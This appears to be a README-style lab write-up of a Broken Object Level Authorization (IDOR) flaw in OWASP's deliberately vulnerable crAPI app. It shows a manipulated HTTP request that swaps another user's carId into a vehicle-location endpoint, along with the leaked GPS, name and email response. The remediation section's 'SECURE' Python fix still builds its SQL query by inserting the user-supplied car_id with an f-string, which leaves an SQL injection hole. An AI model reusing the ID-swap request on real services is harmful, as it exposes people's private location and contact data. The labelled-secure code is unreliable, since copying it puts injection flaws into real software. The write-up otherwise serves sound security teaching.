<div align="center">

```
██████╗  ██████╗ ██╗      █████╗     ██╗██████╗  ██████╗ ██████╗ 
██╔══██╗██╔═══██╗██║     ██╔══██╗    ██║██╔══██╗██╔═══██╗██╔══██╗
██████╔╝██║   ██║██║     ███████║    ██║██║  ██║██║   ██║██████╔╝
██╔══██╗██║   ██║██║     ██╔══██║    ██║██║  ██║██║   ██║██╔══██╗
██████╔╝╚██████╔╝███████╗██║  ██║    ██║██████╔╝╚██████╔╝██║  ██║
╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
```

# 🔓 BOLA / IDOR Vulnerability — crAPI Security Research

**Broken Object Level Authorization (BOLA) | Insecure Direct Object Reference (IDOR)**

![Severity](https://img.shields.io/badge/Severity-HIGH-red?style=for-the-badge&logo=shield)
![OWASP](https://img.shields.io/badge/OWASP-API1%3A2023-orange?style=for-the-badge)
![Platform](https://img.shields.io/badge/Target-crAPI-blueviolet?style=for-the-badge)
![Tool](https://img.shields.io/badge/Tool-Burp%20Suite-ff6633?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Documented-brightgreen?style=for-the-badge)

> *Demonstrating how a missing object-level authorization check allows any authenticated user to access private GPS coordinates, full name, and email address of any other registered user.*

</div>

---

## 📋 Table of Contents

- [🔍 Project Overview](#-project-overview)
- [⚙️ Technical Description](#️-technical-description)
  - [Phase 1 — Information Gathering](#phase-1--information-gathering)
  - [Phase 2 — Traffic Analysis](#phase-2--traffic-analysis)
  - [Phase 3 — Exploitation](#phase-3--exploitation)
- [🖼️ Evidence & Screenshots](#️-evidence--screenshots)
- [💥 Exploit Proof of Concept](#-exploit-proof-of-concept)
- [🛡️ Remediation & Mitigation](#️-remediation--mitigation)
- [🧰 Environment & Tools](#-environment--tools)

---

## 🔍 Project Overview

This project demonstrates the discovery and exploitation of a **Broken Object Level Authorization (BOLA)** vulnerability — also known as an **Insecure Direct Object Reference (IDOR)** — within the **crAPI (Completely Ridiculous API)** ecosystem.

By analyzing API traffic and gathering target information via community features, an authenticated user can access **private location data and personal details** of other registered users — without any special privileges.

> ⚠️ **Disclaimer:** This research was performed in a controlled, intentionally vulnerable lab environment (crAPI). All techniques are documented for **educational purposes only**.

---

## ⚙️ Technical Description

The attack was executed in three primary phases: **Information Gathering**, **Traffic Analysis**, and **Exploitation**.

---

### Phase 1 — Information Gathering

```
[ crAPI Forum ]  →  Identify active users  →  Select target
```

| Step | Action | Detail |
|------|--------|--------|
| 1️⃣ | Navigate to Community Forum | Accessed `/forum` to enumerate active platform users |
| 2️⃣ | Target Identification | Found user **`Pogba`** with active posts on the platform |
| 3️⃣ | Context Harvesting | Retrieved target's `carId` from API/forum response data |

---

### Phase 2 — Traffic Analysis

```
[ Browser ]  →  Burp Suite Proxy  →  Intercept  →  Analyze
```

| Step | Action | Detail |
|------|--------|--------|
| 🔎 | Intercept Traffic | Captured legitimate API requests via **Burp Suite Community Edition** |
| 📍 | Endpoint Discovery | Located the vehicle location endpoint triggered from the dashboard |
| 🔑 | Auth Mechanism | Requests use a standard `Authorization: Bearer <JWT>` token |
| ⚠️ | Flaw Identified | Backend **does not validate** if the JWT owner matches the requested `carId` |

**Vulnerable Endpoint Structure:**
```
GET /identity/api/v2/vehicle/<carId>/location
```

---

### Phase 3 — Exploitation

```
[ Legitimate Request ]  →  Burp Repeater  →  Swap carId  →  Data Leak ✓
```

| Step | Action | Detail |
|------|--------|--------|
| 1️⃣ | Capture Request | Sent legitimate location request to **Burp Repeater** |
| 2️⃣ | Modify Parameter | Replaced own `carId` with Pogba's `carId` |
| 3️⃣ | Execute Request | Sent modified request — server responded with `200 OK` |
| 4️⃣ | Data Exposed | Retrieved Pogba's GPS coordinates, full name, and email |

**Target `carId` used:**
```
cd515c12-0fc1-48ae-8b61-9230b70a845b
```

---

## 🖼️ Evidence & Screenshots

> All screenshots were captured during live testing against the local crAPI instance.

---

### 🎯 Step 1 — Target Identification via Community Forum

> Browsing the crAPI community forum to identify active users and harvest publicly visible asset identifiers.

![Target Identification via Community Forum](https://raw.githubusercontent.com/vetementsvmnts/API-Penetration-Testing/main/04--Black-Box-API-Security-Assessment/Assets/Findings/Target%20Identification%20via%20Community%20Forum.png)

---

### 🕵️ Step 2 — Traffic Interception & Exploitation

> Using Burp Suite Repeater to swap the `carId` parameter and send the manipulated request as an authenticated but unauthorized user.

![Exploitation](https://raw.githubusercontent.com/vetementsvmnts/API-Penetration-Testing/main/04--Black-Box-API-Security-Assessment/Assets/Findings/Exploitation.png)

---

### 💥 Step 3 — Exploit Proof of Concept

> The server responds with `200 OK`, leaking the victim's GPS coordinates, full name, and email address.

![Exploit Proof of Concept](https://raw.githubusercontent.com/vetementsvmnts/API-Penetration-Testing/main/04--Black-Box-API-Security-Assessment/Assets/Findings/Exploit%20Proof%20of%20Concept.png)

---

### 📬 Step 4 — MailHog Local SMTP Mail Flow Monitoring

> MailHog used to monitor local email flows during registration and token generation for the test environment.

![MailHog Local SMTP Mail Flow Monitoring](https://raw.githubusercontent.com/vetementsvmnts/API-Penetration-Testing/main/04--Black-Box-API-Security-Assessment/Assets/Findings/MailHog%20Local%20SMTP%20Mail%20Flow%20Monitoring.png)

---

## 💥 Exploit Proof of Concept

### 🔴 Request — Manipulated API Call

```http
GET /identity/api/v2/vehicle/cd515c12-0fc1-48ae-8b61-9230b70a845b/location HTTP/1.1
Host: localhost:8888
Authorization: Bearer [Your_JWT_Token]
```

> The only change from a legitimate request is the **substituted `carId`** in the URL path. The JWT token belongs to a completely different user.

---

### 🟢 Response — Sensitive Data Leak (`200 OK`)

```json
{
  "carId": "cd515c12-0fc1-48ae-8b61-9230b70a845b",
  "vehicleLocation": {
    "id": 2,
    "latitude": "31.284788",
    "longitude": "-92.471176"
  },
  "fullName": "Pogba",
  "email": "pogbaU06@example.com"
}
```

### 📊 Exposed Data Summary

| Data Field | Value | Sensitivity |
|------------|-------|-------------|
| 🗺️ Latitude | `31.284788` | 🔴 High |
| 🗺️ Longitude | `-92.471176` | 🔴 High |
| 👤 Full Name | `Pogba` | 🟠 Medium |
| 📧 Email Address | `pogbaU06@example.com` | 🔴 High |

---

## 🛡️ Remediation & Mitigation

### Fix 1 — Implement Object-Level Access Control ⭐ Critical

```python
# VULNERABLE — No ownership check
def get_vehicle_location(car_id):
    return db.query(f"SELECT * FROM vehicles WHERE car_id = '{car_id}'")

# SECURE — Validate JWT owner matches vehicle owner
def get_vehicle_location(car_id, jwt_user_id):
    vehicle = db.query(f"SELECT * FROM vehicles WHERE car_id = '{car_id}'")
    if vehicle.owner_id != jwt_user_id:
        raise ForbiddenException("Access denied: you do not own this vehicle.")
    return vehicle.location
```

> On every request, extract the `user_id` from the validated JWT and verify it matches the vehicle's registered owner **before** returning any data.

---

### Fix 2 — Minimize ID Exposure in Public Endpoints

```diff
- Community Forum API Response:
-   { "post": "...", "author": "Pogba", "carId": "cd515c12-..." }

+ Community Forum API Response:
+   { "post": "...", "author": "Pogba" }
```

> Asset identifiers like `carId` should **never** be unnecessarily leaked through public or low-privilege endpoints such as community forums.

---

### Fix 3 — Apply Principle of Least Privilege

```diff
- Location Endpoint Response (Current):
-   { "carId": "...", "vehicleLocation": {...}, "fullName": "Pogba", "email": "pogbaU06@example.com" }

+ Location Endpoint Response (Hardened):
+   { "vehicleLocation": { "latitude": "...", "longitude": "..." } }
```

> If the endpoint's purpose is to return **location data**, it should return **only location data** — not the owner's PII.

---

### 🗂️ Remediation Checklist

- [ ] Add ownership validation against JWT `user_id` on all object-level endpoints
- [ ] Audit all API endpoints that accept user-supplied resource IDs
- [ ] Remove `carId` and other asset identifiers from public/community API responses
- [ ] Strip PII from API responses that do not explicitly require it
- [ ] Implement automated BOLA testing in your CI/CD security pipeline

---

## 🧰 Environment & Tools

| Component | Details |
|-----------|---------|
| 🎯 **Target Application** | crAPI (Completely Ridiculous API) — `localhost:8888` |
| 🕵️ **Interception Proxy** | Burp Suite Community Edition `v2026.4.3` |
| 📬 **Mail Server** | MailHog (local registration & token mail monitoring) |
| 🔐 **Auth Mechanism** | JWT Bearer Token (`Authorization: Bearer <token>`) |
| 🆔 **Identifier Type** | UUID v4 (not sequential, but leaked via forum) |

---

## 📚 References

- [OWASP API Security Top 10 — API1:2023 Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [crAPI — Completely Ridiculous API (OWASP Lab)](https://github.com/OWASP/crAPI)
- [PortSwigger — Insecure Direct Object References (IDOR)](https://portswigger.net/web-security/access-control/idor)

---

<div align="center">

*Researched and documented for educational purposes in a controlled lab environment.*

![Made with](https://img.shields.io/badge/Made%20with-❤️%20%26%20Burp%20Suite-ff6633?style=flat-square)
![OWASP](https://img.shields.io/badge/OWASP-crAPI%20Lab-blue?style=flat-square)

</div>
